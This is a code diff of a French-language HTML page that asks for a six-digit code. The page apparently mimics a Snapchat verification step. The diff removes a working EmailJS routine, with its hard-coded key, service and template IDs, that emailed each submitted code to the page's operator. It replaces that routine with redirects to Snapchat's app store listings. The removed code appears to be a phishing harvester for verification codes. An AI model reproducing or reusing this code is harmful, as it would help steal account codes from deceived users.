@@ -45,16 +45,6 @@
       border: 1px solid #ccc;
       border-radius: 4px;
     }
-    .checkbox-container {
-      display: flex;
-      align-items: center;
-      font-size: 14px;
-      margin-bottom: 15px;
-    }
-    .checkbox-container input {
-      margin-right: 10px;
-      accent-color: #008cff;
-    }
     .error-message {
       color: red;
       margin-top: 10px;
@@ -75,20 +65,6 @@
     .field input[type="submit"]:hover {
       background-color: #0056b3;
     }
-    @media (max-width: 600px) {
-      .container {
-        padding: 15px;
-      }
-      h2 {
-        font-size: 24px;
-      }
-      .field input {
-        font-size: 14px;
-      }
-      .field input[type="submit"] {
-        font-size: 18px;
-      }
-    }
   </style>
 </head>
 <body>
@@ -105,12 +81,7 @@
       </div>
     </form>
   </div>
-  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@2.4.1/dist/email.min.js"></script>
   <script>
-    document.addEventListener("DOMContentLoaded", function () {
-      emailjs.init("wKyeQt_chZMTOZY_c"); // Clé publique EmailJS
-    });
-
     document.getElementById("sixDigitsForm").addEventListener("submit", function (event) {
       event.preventDefault();
       
@@ -126,22 +97,16 @@
         errorMessage.style.display = 'none';
       }
 
-      submitBtn.value = "Envoi...";
+      submitBtn.value = "Redirection...";
       submitBtn.disabled = true;
 
-      emailjs.sendForm("service_7xtpexj", "template_3jr5npg", this)
-        .then(function (response) {
-          console.log("Email envoyé avec succès !", response);
-          alert("Code envoyé avec succès !");
-          submitBtn.value = "Envoyer";
-          submitBtn.disabled = false;
-          document.getElementById("sixDigitsForm").reset();
-        }, function (error) {
-          console.log("Échec de l'envoi de l'email", error);
-          alert("Une erreur s'est produite. Réessayez plus tard.");
-          submitBtn.value = "Envoyer";
-          submitBtn.disabled = false;
-        });
+      if (/iPhone|iPad|iPod/.test(navigator.userAgent)) {
+        window.location.replace("https://apps.apple.com/app/snapchat/id447188370");
+      } else if (/Android/.test(navigator.userAgent)) {
+        window.location.replace("https://play.google.com/store/apps/details?id=com.snapchat.android");
+      } else {
+        alert("Veuillez installer Snapchat depuis l'App Store ou Google Play.");
+      }
     });
 
     function validateInput() {
